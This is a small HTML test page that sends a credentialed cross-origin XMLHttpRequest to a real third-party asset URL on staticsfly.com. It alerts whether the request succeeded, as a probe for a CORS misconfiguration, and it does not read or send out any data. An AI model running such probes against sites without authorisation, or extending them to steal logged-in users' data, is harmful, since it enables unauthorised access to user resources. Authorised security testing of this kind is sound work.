<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS Test</title>
</head>
<body>
    <h1>Hello Team World</h1>
    <p>Testing for CORS vulnerability.</p>

    <script>
        var req = new XMLHttpRequest();
        req.open('GET', 'https://c1.staticsfly.com/asset/fetch/cs/PZN_FRAME-337076-4064-MERCHLARGE_FRONT/thumbnail.preview/v1', true);
        req.withCredentials = true;
        req.onload = function() {
            if (req.status === 200) {
                alert('CORS Vulnerability: Resource accessed!');
            } else {
                alert('Request failed or CORS not exploitable.');
            }
        };
        req.send();
    </script>
</body>
</html>
